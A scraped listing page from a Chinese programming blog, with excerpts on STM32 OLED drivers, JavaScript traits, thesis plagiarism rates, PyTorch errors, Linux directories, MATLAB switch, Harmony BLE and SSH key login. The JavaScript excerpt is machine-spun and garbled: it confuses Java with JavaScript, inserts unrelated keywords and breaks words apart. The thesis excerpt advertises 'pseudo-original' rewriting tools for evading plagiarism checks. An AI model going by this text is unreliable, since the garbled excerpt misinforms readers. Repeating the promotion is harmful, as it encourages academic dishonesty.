由于我的开发板上有外部晶振，可以给STM32提速。将高速时钟源HSE设置为Crystal/Ceramic Resonator ,随后打开 Clock Configuration 时钟设置。将HCLK这里设置最大值72.。也就是切换到了外部晶振和72MHZ的时钟频率
而后勾选上为每个外设生成对饮的头文件和源文件。保存并生成代码
结合STM32:AHT20温湿度传感器驱动程序开发-CSDN博客中的配置，实现AHT20温湿度测试结果在OLED屏幕上显示。
三、OLED驱动库 (1) 资源下载
https://download.csdn.net/download/superSmart_Dong/88555975 可下载。
其中oled.c/oled.h为oled驱动实现，font.h/font.c为字模图模。aht20.c/aht20.h为AHT驱动实现。
(2)字模图模获取地址。
led.baud-dance.com
(3) 资源库的说明。
在波特律动LED字模生成器获取字模。
获取到的字模放在如下数组中，并调整数组大小和头文件等。这样才可以在OLED显示
获取到的图模数据复制下来，记下图模宽和高。
将复制的数据贴到font.c和在font.h中声明。调用
OLED_DrawPicture(oled_x,oled_y, size_wide,size_hight, iconVardata, OLED_COLOR_NORMAL);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/237523b53f0946aa1f2c36cd7be229b5/" rel="bookmark">
			javascript的基本特点有哪些,javascript的特性有哪些
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章给大家谈谈javascript的主要特点有哪些，以及javascript的基本特点有哪些，希望对各位有所帮助，不要忘了收藏本站喔。
java有哪些特点？
1、解释性的脚本语言（代码不进行预编译）
与其他脚本语言一样，JavaScript也是一种解释性语言，它提供了非常方便的开发过程。JavaScript的基本语法结构与C、C++、Java非常相似python for语句用法。
但是在使用之前，与这些语言不同，它们需要先被编译，但是在运行程序的过程中需要逐行解释。java与HTML标识符结合使用，方便用户操作。
2、基于对象
它也可以看作是一种面向对象的语言，这意味着JavaScript可以使用它创建的对象。因此，许多函数可以来自脚本环境中对象方法和脚本之间的交互。
3、简单而弱的类型
它的简单性主要体现在：第一，JavaScript是一个基于Java基本语句和控制流的简单而紧凑的设计，这是一个非常好的过渡，供用户学习Java或其他C语言编程语言。
而对于具有C语言编程能力的程序员来说，JavaScript非常容易使用；其次，它的变量TYP。ES是弱势阶级。类型1不使用严格的数据类型。
4、安全性
JavaScript是一种安全性语言，它不允许访问本地的硬盘，并不能将数据存入到服务器上，不允许对网络文档进行修改和删除，只能通过浏览器实现信息浏览或动态交互。从而有效地防止数据的丢失。
5、事件驱动
java以事件驱动的方式响应用户。通过在网页中执行操作生成的操作称为事件。例如，按下鼠标，移动窗口，选择菜单等都可以视为事件。
当一个事件发生时，它可能会引起相应的事件响应并执行一些相应的脚本。这种机制称为“事件驱动”。
6、跨平台
JavaScript依赖于浏览器本身，与操作环境无关。只要计算机能运行浏览器，支持java浏览器，就可以正确执行，实现“一次写，环游世界”的梦想。
因此，java是一种可以嵌入到HTML文件中的新描述语言。JavaScript语言可以响应用户需求事件（例如表单输入），而不需要任何网络来回传输数据。因此，当用户输入数据时，数据可以由客户机应用程序直接处理，而不是由服务器处理。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b4e17d54e8f971a7f3b7e18546c94ca/" rel="bookmark">
			从57%到6%‼️毕业论文的重复率是什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，今天来聊聊毕业论文的重复率是什么，希望能给大家提供一点参考。
以下是针对论文重复率高的情况，借助工具修改，提供一些修改建议和技巧：
论文降重同义句转换网站 http://lw.kuaimalunwen.com/
快码写作是一款实用的在线智能论文降重工具，旨在帮助用户快速、高效地修改论文，降低重复率。通过使用先进的自然语言处理技术，快码写作能够自动检测论文中的重复内容，并生成与之相关的同义句，使论文更加流畅、自然。
该工具不仅可以进行智能化的同义句转换，还可以根据用户的需求提供个性化的论文修改建议。通过使用快码写作，用户可以节省大量时间和精力，专注于论文的实质性内容和创新性研究。
毕业论文重复率是指毕业论文中被认定为重复的部分在全文中所占的比例。重复率是衡量论文原创性和质量的重要指标，也是学术诚信和规范的重要组成部分。
一、毕业论文的重复率是什么意思 在毕业论文的撰写过程中，学生需要引用和参考前人的研究成果和文献资料，以支持自己的观点和结论小猫伪原创。但是，如果直接复制粘贴他人的内容，或者对原文进行简单的修改，都会导致重复率的提高。因此，学生在撰写毕业论文时，需要注意引用的规范和修改的技巧，以避免出现高重复率的情况。
二、毕业论文的重复率是什么标准 为了降低毕业论文的重复率，学生可以使用一些智能降重工具，如小发猫伪原创、神码ai、GPT改写等。这些工具可以帮助学生对论文进行伪原创、重写、改写等操作，从而降低论文的重复率。但是需要注意的是，这些工具只能辅助我们修改重复率过高的部分，而不能完全代替我们的思考和写作。
三、毕业论文重复率指什么 此外，学生在引用他人的文献资料时，需要注意引文的格式和规范，以避免因引文格式错误而导致的不必要重复。同时，学生在撰写论文时，也需要注意论文的结构、内容和逻辑性，以提高论文的质量和创新性。
四、毕业论文重复率是怎么算的 总之，毕业论文的重复率是衡量论文原创性和质量的重要指标，也是学术诚信和规范的重要组成部分。学生在撰写毕业论文时，需要注意引用的规范和修改的技巧，以避免出现高重复率的情况。同时，也需要全面考虑各个方面的因素，力求撰写出一篇高质量的学术论文。
毕业论文的重复率是什么相关文章：
从56%到6%‼️怎么写论文才能减少重复率
从55%到10%‼️wps自动降重功能靠谱吗
从63%到5%‼️毕业论文查重修改技巧
从58%到5%‼️一键修改文案
从57%到11%‼️句子意思转换器
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0ac56dad222aca633b94e6fb036140d/" rel="bookmark">
			Pytorch实现深度学习常见问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RuntimeError: stack expects each tensor to be equal size, but got [3, 300, 300] at entry 0 and [3, 301, 301] at entry 24 这里的问题出现的原因肯定是在数据预处理处，如下图，当数据使用不同的transforms处理方式时，会导致数据的尺寸大小不统一，从而造成报错
Input type (torch.FloatTensor) and weight type (torch.cuda.FloatTensor) should be the same pytorch进行代码debug调式的时候无法进行单步调式 pycharm中 pytorch代码无法单步调试
最初 num_workers=2
debug的时候，点击step over，就只显示Connected.无法单步调试。
原因是，代码中存在多线程。
解决办法1： 改为num_workers=0解决办法2：打开Setting界面, 搜gevent，在如下设置项中勾选“Gevent compatibe“
在PyCharm中，"Gevent compatible"模式是一种调试模式，用于在使用Gevent库时进行调试。Gevent是一个基于协程的Python网络库，它提供了高性能的并发和异步编程能力。
在"Gevent compatible"模式下，PyCharm会自动处理Gevent库中的协程调度，以便在调试过程中正确地暂停和恢复协程的执行。这样，你就可以在调试过程中逐行查看代码、检查变量值等，而不会影响协程的正常执行
conda创建虚拟环境报错
【bug】【conda】conda.core.subdir_data.Response304ContentUnchanged Traceback (most recent call last): File "/home/rainbow/miniconda3/lib/python3.7/site-packages/conda/core/subdir_data.py", line 379, in _load repodata_fn=self.repodata_fn) File "/home/rainbow/miniconda3/lib/python3.7/site-packages/conda/core/subdir_data.py", line 815, in fetch_repodata_remote_request raise Response304ContentUnchanged() conda.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0ac56dad222aca633b94e6fb036140d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93a51e38acee0caae953a3e421adc998/" rel="bookmark">
			Linux文件目录以及文件类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Home根目录 //bin/sbin/etc/root/lib/dev/proc/sys/tmp/boot/mnt/media/usr 文件类型 Home 当尝试使用gedit等编辑器保存文件时，系统默认通常会先打开个人用户的“家”（home）目录， 建议在通常情况下个人相关的内容也是保存在该目录中，因为其它目录大都是系统相关的， 使用时容易导致混乱，而且需要相关权限。
“home”目录与Win10系统的个人目录非常相似。Ubuntu和Win10希望用户使用时个人的内容都存放在个人目录，主要是为了与系统核心文件区分开来， 因为他们通常不希望普通用户修改系统相关的内容，而且人个目录分开也便于系统升级。
在windows下，通常会另外新建磁盘啦专门存储不同的内容，如D、E、F盘等等，但是在Ubuntu下需要这个功能时，发现她并没有罗列出众多磁盘，它所有的内容都位于根目录下。
根目录 / 根目录是Linux下所有文件和目录的起点，它的路径用斜杠符号“/”来表示。通过cd /可以打开根目录，并且使用ls即可查看根目录下所有内容。
前面说明的家目录（个人目录）路径为“/home/用户名/”，也就是说，在Ubuntu系统下，用户的个人目录都在“/home”下， 并且按照用户名命名，如果系统下有多个用户A、B、C并且它们都有个人目录的话， 那么它们的个人目录路径默认就是“/home/A”，“/home/B”，“/home/C”。在这方面， 跟Windows系统是类似的，在Windows系统下，个人目录默认是“C:/Users/A”，“C:/Users/B”，“C:/Users/C”。
如果我们把/home的个人目录排除掉，实质上Linux的根目录与Windows系统C:/Windows目录的功能类似， 都是系统核心的文件，只是对于Windows用户通常不需要了解系统文件目录罢了。 如果仅把Linux系统用于普通的桌面应用，实际上也不需要多么了解它的根目录内容。
但是当我们利用Linux系统进行开发或用于服务器时，一般需要给系统安装各种软件工具， 又或者需要对系统和工具进行配置，常常不可避免地要修改根目录下的文件内容。 如软件工具默认安装在/usr/bin目录，软件工具的配置文件可能位于/etc目录， 甚至系统的日常使用如插入U盘或光盘，又发现它们不会像Windows有独立的盘符可以访问， 而是默认挂载在/media或/mnt目录下。
根目录的结构如下：
整个Linux系统有且只有一棵从根目录开始的目录树，如下图所示。
所以如果一个计算机中如果有多个硬盘，也不会呈现出Windows下的C、D、E盘的结构， 强行复制Windows下习惯的话，可以在根目录下创建C、D、E目录， 然后把磁盘C、D、E挂载在/C、/D或/E目录下，即它们仍然从属于“/”根目录，不过在Linux下通常不会这么用。
目录树只是一个管理上的概念，它本身并不跟硬件挂钩的，例如这些文件之所以是存储在磁盘中， 是因为在安装系统时，已经把整个根目录“挂载”在了磁盘上。所谓挂载就是把存储器的分区与某个目录对应起来， 对该目录进行访问时，相应的操作会被映射到其挂载的存储器分区， 而这些存储器包括磁盘、光盘、U盘、NAND FLASH等。
不同的发行版对根目录的理解不同，但它们大都遵守文件层次标准 （FHS， Filesystem Hierarchy Standard），所以根目录下的各个子目录内容和功能大致如下表所示:
目录目录放置的内容bin存放系统命令的目录，如命令cat，cp，mkdirboot存放开机启动过程所需的内容，如开机管理程序grub2dev所有设备文件的目录（如声卡、硬盘、光驱）etc系统的主要配置文件home用户家目录数据的存放目录lib存放sbin和bin目录下命令所需的库文件lib32/lib64存放二进制函数库，支持32位/64位lost+found在EXT3/4系统中，当系统意外崩溃或意外关机时，会产生一些碎片文件在这个目录下面，系统启动fcsk工具会检查这个目录，并修复已损坏的文件。media用于挂载光盘，软盘和DVD等设备mnt同media作用一样，用于临时挂载存储设备opt第三方软件安装存放目录。proc进程及内核信息存放目录，不占用硬盘空间。rootroot用户的家目录run是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。sbinroot用户使用的命令存放目录srv一些网络服务所需要的数据文件sys同proc目录，用于记录CPU与系统硬件的相关信息tmp程序运行时产生的临时文件存放目录usr系统存放程序的目录，类似于在windows下的文件夹programefilesvar存放内容常变动的文件目录，如系统日志文件 /bin /bin目录是/binary的缩写，它包含众多普通用户可用的命令。而命令的本质就是可执行程序， 即二进制bin文件。熟悉Linux命令后，回头再来本目录看看，会发现ls、cp、cat等命令， 都可以在此处找到:
/sbin /sbin目录是/system bin的缩写，它的功能类似/bin ，不过它存储的一般是系统程序， 一般需要使用管理员权限才能使用。如显示系统已加载的模块命令lsmod、对存储器分区进行格式化的mkfs等。
/etc /etc目录是/etcetera的缩写，据说原始的Unix设计是在该目录存放些零碎的内容， 但现在该目录现在已发展成存放系统的各种配置文件，非常重要。如用户信息文件/etc/passwd， 系统初始化文件/etc/rc等，系统依据这些配置运行。在给系统安装某些软件或服务后， 常常需要修改/etc目录下的文件进行配置。
/root /root是超级用户的目录，在Ubuntu下默认为空。
/lib /lib目录是/library的缩写，根文件系统上的程序所需的共享库，存放了根文件系统程序运行所需的共享文件。 如C语言标准库，这些文件包含了可被许多程序共享的代码，以避免每个程序都包含有相同的子程序的副本， 故可以使得可执行文件变得更小，节省空间。如代码A和代码B都使用到C语言标准库的printf和malloc函数， 那么它们就可以共用文件系统上的C库内容， 代码A和代码B自身就不需要把C库的这部分内容添加到自己发布的程序包中了。
/dev /dev目录存放了设备文件，即设备驱动程序，用户通过这些文件访问外部设备。 比如，用户可以通过访问/dev/mouse来访问鼠标的输入，就像访问其他文件一样。
/proc /proc目录通常包含了内核导出到用户空间的内核信息，通过访问该目录下的文件可以查看这些信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93a51e38acee0caae953a3e421adc998/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b69aa879aa08210d0f7d5808938e54ea/" rel="bookmark">
			MATLAB 嵌套switch语句||MATLAB while循环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB 嵌套switch语句 在 MATLAB 中嵌套 switch 语句是可能的，可以在 switch 一部分外嵌套 switch 语句序列。即使 case 常量的内部和外部的 switch 含有共同的值，也不算冲突出现。
MATLAB嵌套switch语句语法 嵌套switch语句的语法如下：
switch(ch1) case 'A' fprintf('This A is part of outer switch'); switch(ch2) case 'A' fprintf('This A is part of inner switch' ); case 'B' fprintf('This B is part of inner switch' ); end case 'B' fprintf('This B is part of outer switch' ); end 详细例子: 在MATLAB中建立一个脚本文件，并输入下面的代码：
a = 100; b = 200; switch(a) case 100 fprintf('This is part of outer switch %d ', a ); switch(b) case 200 fprintf('This is part of inner switch %d ', b ); end end fprintf('Exact value of a is : %d ', a ); fprintf('Exact value of b is : %d ', b ); 当运行该文件时，它会显示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b69aa879aa08210d0f7d5808938e54ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d6d2881909715abd3b79decbfdd068b/" rel="bookmark">
			Harmony Ble 蓝牙App （一）扫描
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Harmony Ble 蓝牙App （一）扫描 前言正文一、创建工程二、工程配置① 权限配置② Debug配置③ UI配置 三、扫描① 扫描接口② 扫描类 四、业务处理① Slice的生命周期② 蓝牙开关和动态权限请求 五、扫描设备六、显示设备① 自定义蓝牙类② 提供者③ 显示设备 七、源码 前言 关于Android的低功耗蓝牙，我做了很多介绍了，那么对于Harmony来说这一块我没有做过介绍，而实际中我确实做过一个Harmony的BLE项目，所以这里分享一些内容出来。
正文 在Harmony中进行Ble的蓝牙开发实际上和Android中类似，但是又有一些不同，因为Harmony的SDK还在不断的完善。而这里我们使用的是API 6进行项目开发，使用的语言是Java，至于为什么使用API 6而不是最新的API 9，因为我买不起遥遥领先，所以只能用API 6的HUAWEI P30进行真机测试。蓝牙这种APP一定是要使用真机测试的，你用虚拟机是不行的，话不多说，我们开始吧。
一、创建工程 下面开始创建工程。
选择Empty Ability，点击Next。我们创建一个名为HarmonyBle的项目，语言为Java。
点击Finish完成创建。
默认的工程就是这个样子的，是不是很像Android创建的工程呢？
二、工程配置 ① 权限配置 Harmony中同样有权限这个概念，也需要配置静态权限和动态权限，只不过配置静态权限的地方不一样。Harmony是在config.json中，里面的代码如下：
{ "app": { "bundleName": "com.llw.ble", "vendor": "example", "version": { "code": 1000000, "name": "1.0.0" } }, "deviceConfig": { }, "module": { "package": "com.llw.ble", "name": ".MyApplication", "mainAbility": "com.llw.ble.MainAbility", "deviceType": [ "phone", "tablet", "tv", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d6d2881909715abd3b79decbfdd068b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77aec34c20b0a01bc139fa5fa1e79679/" rel="bookmark">
			服务器SSH（免密登录）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用scp 或者 rsync命令在多台Linux服务器之间同步文件时需要输入密码，除了使用expect实现自动化交互以外，还有一种方法就是配置服务器之间ssh免密登录，本文记录一下具体配置过程。 一、创建.ssh目录 假定有2台Linux主机，分别为A，B
在所有主机上创建ssh目录并赋予权限
mkdir /root/.ssh chmod 700 /root/.ssh 二、生成公钥与私钥 所有主机生成公钥与私钥，执行以下命令：
# 进⼊入用户目录 cd ~ ​ # 生成ssh密码，-t 参数表示生成算法，可以选择rsa和dsa；-P表示使用的密码，""表示无密码。 ssh-keygen -t rsa -P "" 出现Enter file in which to save the key (/root/.ssh/id_rsa): （直接回车（Enter））
三、将公钥追加authorized_keys文件中 将第一台主机A上生成公钥追加到authorized_keys文件中
# 进入.ssh目录 cd ~/.ssh ​ # 将id_rsa.pub的内容追加到authorized_keys文件中 cat id_rsa.pub &gt;&gt; authorized_keys 然后可以删除A上的id_rsa.pub文件，因为已经写进了authorized_keys文件中
rm -rf id_rsa.pub 或者 mv id_rsa.pub id_rsa.pub.copy 接下来将B的id_rsa.pub写入到A的authorized_keys文件中，使用scp 或者 rsync命令分别将B机器的id_rsa.pub复制到主机A 。（scp 或者 rsync命令的使用方法可参考文章使用SCP或Rsync实现Linux主机之间文件、目录的复制）（同样的操作）
在主机B上操作 ：
# hostA为A的主机名或者A的IP地址 scp id_rsa.pub hostA:~/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77aec34c20b0a01bc139fa5fa1e79679/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/67/">«</a>
	<span class="pagination__item pagination__item--current">68/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/69/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>